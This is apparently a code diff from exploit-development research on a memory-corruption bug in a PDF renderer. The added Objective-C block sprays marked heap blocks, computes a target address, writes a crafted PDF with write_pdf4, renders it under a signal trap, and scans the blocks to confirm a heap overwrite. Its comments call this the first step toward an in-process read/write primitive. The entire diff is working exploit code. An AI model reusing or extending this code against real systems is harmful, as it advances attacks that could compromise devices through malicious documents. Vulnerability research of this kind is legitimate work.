@@ -457,6 +457,67 @@ NSString *ModShading5Force(void) {
         }
     }
 
+    // ---- heap victims: aim the same primitive at marked heap objects ---------
+    // the confirmed write is (address = our literal + 0x6300, value = our literal,
+    // ~924 slots).  Pointing it at a sprayed marked block instead of our own page
+    // measures whether it reaches heap objects - the in-process R/W step's first
+    // fact.  A mapped target does not fault, so no mmap-force is involved.
+    if (!verdict) {
+        enum { NV = 32, VSZ = 16384 };
+        static void *vic[NV];
+        int nv = 0;
+        for (int i = 0; i < NV; i++) {
+            void *p = malloc(VSZ);
+            if (!p) break;
+            carpet_fill(p, VSZ, -1);
+            vic[nv++] = p;
+        }
+        AvePost([NSString stringWithFormat:@"112611 victims: %d marked heap blocks of %d B", nv, VSZ]);
+        if (nv >= 2) {
+            uint64_t spanAddr = (uint64_t)(uintptr_t)vic[1];      // victim 1's body
+            uint64_t literal = spanAddr - 0x6300;                 // span starts there
+            AvePost([NSString stringWithFormat:@"112611 victim aim: literal=%#llx -> span at victim1 "
+                     @"(%#llx)", (unsigned long long)literal, (unsigned long long)spanAddr]);
+            if (write_pdf4(path, literal, 2816, 64, 2) == 0) {
+                g_in_probe = 1; g_mapped = 0; g_page = 0; g_far = 0; g_sig = 0; g_esr = 0;
+                if (sigsetjmp(g_jb, 1) == 0) {
+                    int painted = render_pdf(path);
+                    g_in_probe = 0;
+                    AvePost([NSString stringWithFormat:@"112611 victim render: painted %d/4096", painted]);
+                } else {
+                    g_in_probe = 0;
+                    AvePost(@"112611 victim: faulted (unexpected for a mapped target)");
+                }
+                int hitWords = 0, changed = 0, firstVic = -1; size_t firstOff = 0;
+                for (int i = 0; i < nv; i++) {
+                    uint16_t *m = (uint16_t *)vic[i];
+                    size_t n16 = VSZ / 2;
+                    for (size_t j = 0; j < n16; j++) {
+                        uint16_t want = (uint16_t)(0x0100 + (j & 0xFF));
+                        if (m[j] != want) {
+                            changed++;
+                            if (firstVic < 0) { firstVic = i; firstOff = j * 2; }
+                        }
+                    }
+                    uint64_t *w = (uint64_t *)vic[i];
+                    for (size_t k = 0; k < VSZ / 8; k++)
+                        if (w[k] == literal) hitWords++;
+                }
+                AvePost([NSString stringWithFormat:@"112611 victim scan: %d changed u16, %d words == "
+                         @"literal, first change in victim %d at +%#zx", changed, hitWords,
+                         firstVic, firstOff]);
+                if (hitWords) {
+                    AvePost(@"112611 verdict: HEAP VICTIM OVERWRITE CONFIRMED (the write reaches heap objects)");
+                    verdict = @"112611: HEAP VICTIM OVERWRITE CONFIRMED";
+                } else if (changed) {
+                    AvePost(@"112611 verdict: victim body changed but not by our literal - see offsets");
+                    verdict = [NSString stringWithFormat:@"112611: victim body changed (%d u16, first "
+                               @"victim %d +%#zx)", changed, firstVic, firstOff];
+                }
+            }
+        }
+    }
+
     if (!verdict) {
         AvePost([NSString stringWithFormat:@"112611 verdict: no fault across C0=%d..%d and no aimed hit "
                  @"- the overflow either does not write or writes outside our pages on this build",
